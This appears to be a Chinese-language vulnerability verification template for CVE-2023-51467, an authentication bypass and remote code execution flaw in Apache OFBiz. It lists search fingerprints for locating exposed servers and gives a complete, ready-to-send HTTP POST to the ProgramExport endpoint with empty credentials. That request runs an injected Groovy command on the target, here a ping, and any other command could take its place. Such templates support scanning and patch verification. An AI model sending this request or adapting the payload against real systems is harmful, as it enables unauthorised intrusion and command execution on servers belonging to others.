﻿# Apache OFBiz ProgramExport RCE

> 更新时间：2023-12-31

> 漏洞编号：CVE-2023-51467

> 漏洞说明：Apache OFBiz是一个电子商务平台Q，用于构建大中型企业级、跨平台、跨数据库、跨应用服务器的多层、分布式电子商务类应用系统。该系统的身份验证机制存在缺陷，可能允许未授权用户通过绕过标准登录流程来获取后台访问权限。此外，在处理特定数据输入时，攻击者可构造恶意请求绕过身份认证，利用后台相关接口功能执行groovy代码，导致远程代码执行。

> 漏洞特征：cert="Organizational Unit: Apache OFBiz" || (body="www.ofbiz.org" && body="/images/ofbiz_powered.gif") || header="Set-Cookie: OFBiz.Visitor" || banner="Set-Cookie: OFBiz.Visitor"

> 验证脚本：HTTP

```
POST /webtools/control/ProgramExport?USERNAME=&PASSWORD=&requirePasswordChange=Y HTTP/1.1
Accept:*/*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip,deflate,br
Accept-Language:en-US,en;g=0.9
Connection: close
 
groovyProgram=import+groovy.lang.GroovyShell%0D%0A%0D%0AGroovyShell+shell+%3D+new+GroovyShell%28%29%3B%0D%0Ashell.evaluate%28%27%22ping www.baidu.com%22.execute%28%29%27%29
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：


> 验证文件来源：Apache OFBiz ProgramExport RCE
